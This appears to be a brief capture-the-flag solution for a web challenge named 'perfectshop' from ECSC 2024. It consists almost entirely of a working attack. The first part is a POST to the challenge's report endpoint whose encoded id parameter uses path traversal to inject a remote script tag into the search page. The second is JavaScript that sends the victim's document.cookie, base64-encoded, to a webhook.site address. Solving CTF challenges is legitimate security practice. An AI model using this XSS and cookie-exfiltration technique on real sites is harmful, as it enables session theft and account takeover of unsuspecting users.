Send a post request to http://perfectshop.challs.open.ecsc2024.it/report with the following parameters:

* `id=2/../../search?q=%25%33%63script src=http://<REPLACE_WITH_YOUR_DOMAIN>/x%25%33%65%25%33%63%25%32%66%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%65/admin`
* `message=foo`

The static file `x` on your domain is included as JavaScript. Put the following code in `x`:

```javascript
window.location = "https://webhook.site/<REPLACE_WITH_YOUR_ID>?" + btoa(document.cookie);
```
